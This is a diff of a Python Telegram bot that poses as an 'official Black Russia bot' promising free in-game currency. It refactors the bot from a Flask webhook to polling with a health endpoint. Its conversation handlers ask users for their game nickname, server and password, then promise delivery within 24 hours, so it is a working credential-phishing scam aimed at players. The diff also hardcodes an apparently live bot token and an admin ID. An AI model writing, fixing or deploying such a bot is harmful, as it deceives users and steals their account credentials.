@@ -1,36 +1,43 @@
 import logging
 import os
-from flask import Flask, request
+import asyncio
+from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
-BOT_TOKEN = "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM"
-ADMIN_ID = 6005507174
+# ========== КОНФИГ ==========
+TOKEN = os.environ.get("BOT_TOKEN", "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "6005507174"))
 
+# Состояния для разговора
 NICKNAME, SERVER, PASSWORD = range(3)
+
+# Хранилище данных
 user_data = {}
 
-def get_main_menu():
+# ========== КЛАВИАТУРЫ ==========
+def main_menu():
     keyboard = [
         [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
         [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
+# ========== ОБРАБОТЧИКИ ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = (
+    text = (
         "👋 *Добро пожаловать!*\n\n"
         "🤵 *Официальный бот от Black Russia*\n"
         "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
         "⬇️ Используй кнопки ниже:"
     )
-    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())
+    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    welcome_text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
-    await query.edit_message_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())
+    text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
+    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -79,7 +86,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💰 Валюта придет в течение *24 часов*.\n"
             "🙏 Спасибо!",
             parse_mode="Markdown",
-            reply_markup=get_main_menu()
+            reply_markup=main_menu()
         )
     except Exception as e:
         await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")
@@ -101,52 +108,60 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")
 
-# ========== НАСТРОЙКА ==========
-app = Flask(__name__)
+# ========== ЗАПУСК БОТА ==========
+async def run_bot():
+    logging.basicConfig(level=logging.INFO)
+    
+    application = Application.builder().token(TOKEN).build()
+    
+    # Регистрируем обработчики
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
+        states={
+            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
+            SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
+            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("admin", admin_panel))
+    application.add_handler(CommandHandler("id", get_id))
+    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
+    application.add_handler(conv_handler)
+    
+    logging.info("🚀 Бот запущен!")
+    
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+    
+    # Держим бота живым
+    while True:
+        await asyncio.sleep(3600)
 
-bot_app = Application.builder().token(BOT_TOKEN).build()
+# ========== FLASK ДЛЯ RENDER ==========
+app_flask = Flask(__name__)
 
-conv_handler = ConversationHandler(
-    entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
-    states={
-        NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
-        SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
-        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
-    },
-    fallbacks=[CommandHandler("cancel", cancel)],
-)
+@app_flask.route('/')
+def home():
+    return "Bot is running!"
 
-bot_app.add_handler(CommandHandler("start", start))
-bot_app.add_handler(CommandHandler("admin", admin_panel))
-bot_app.add_handler(CommandHandler("id", get_id))
-bot_app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
-bot_app.add_handler(conv_handler)
+@app_flask.route('/health')
+def health():
+    return "OK"
 
-# Принудительная установка вебхука при старте
-WEBHOOK_URL = None
-
-@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
-def webhook():
-    update = Update.de_json(request.get_json(), bot_app.bot)
-    bot_app.process_update(update)
-    return "ok", 200
-
-@app.route("/")
-def index():
-    return "Bot is running!", 200
-
+# ========== ЗАПУСК ==========
 if __name__ == "__main__":
-    import sys
-    port = int(os.getenv("PORT", 8080))
-    render_url = os.getenv("RENDER_EXTERNAL_URL")
+    import threading
     
-    if render_url:
-        webhook_url = f"{render_url}/webhook/{BOT_TOKEN}"
-        print(f"Setting webhook to: {webhook_url}")
-        bot_app.bot.set_webhook(webhook_url)
-        print("Webhook set successfully!")
-    else:
-        print("No RENDER_EXTERNAL_URL, running with polling...")
+    port = int(os.environ.get("PORT", 8000))
     
-    print(f"Starting Flask server on port {port}")
-    app.run(host="0.0.0.0", port=port)
+    # Запускаем Flask в отдельном потоке
+    flask_thread = threading.Thread(target=lambda: app_flask.run(host="0.0.0.0", port=port))
+    flask_thread.daemon = True
+    flask_thread.start()
+    
+    # Запускаем бота
+    asyncio.run(run_bot())
